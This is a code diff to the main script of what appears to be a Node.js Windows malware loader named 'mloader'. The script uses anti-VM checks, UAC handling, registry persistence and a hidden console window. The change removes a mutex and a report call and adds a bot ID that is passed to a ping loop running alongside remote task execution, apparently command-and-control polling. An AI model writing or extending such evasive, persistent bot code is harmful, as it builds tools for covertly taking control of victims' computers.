@@ -1,6 +1,5 @@
 const fs = require('fs');
 const path = require('path');
-const windowsMutex = require('windows-mutex');
 const config = require('./config');
 const core = require('./utils/core');
 const uac = require('./utils/uac');
@@ -10,11 +9,7 @@ const tasks = require('./utils/tasks');
 const ping = require('./utils/ping');
 const consoleWindow = require("node-hide-console-window");
 
-let mutex;
-
 async function main() {
-    mutex = new windowsMutex.Mutex('mloader');
-
     if (config.antivm) {
         if (core.inVm()) {
             return
@@ -57,22 +52,16 @@ async function main() {
             } else {
                 persistence.addRegistryPersistence(process.execPath, random);
             }
-
-            report.submitReport();
         }
     }
+    
+    const botId = await report.getBotId();
 
     await Promise.all([
-        ping.runPing(),
+        ping.runPing(botId),
         tasks.runTasks()
     ]);
-
-    mutex.release();
 }
 
 consoleWindow.hideConsole();
 main();
-
-module.exports = {
-    mutex
-}
